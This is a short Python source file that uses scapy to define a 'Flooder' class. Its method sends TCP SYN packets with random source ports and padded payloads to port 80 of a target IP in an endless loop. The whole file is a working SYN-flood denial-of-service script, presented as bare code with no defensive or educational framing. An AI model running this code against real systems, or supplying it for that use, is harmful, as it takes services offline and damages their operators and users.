import socket
from scapy.all import *
from scapy.layers.inet import IP, TCP


class Flooder:
    def __init__(self, ip):
        self.ip = ip

    def tcp_syn_flood(self):
        ipp = IP(dst=self.ip)
        tcpp = TCP(sport=RandShort(), dport=80, flags="S")
        raw = Raw(b"X"*1024)
        p = ipp / tcpp / raw
        while True:
            send(p, loop=0, verbose=0)
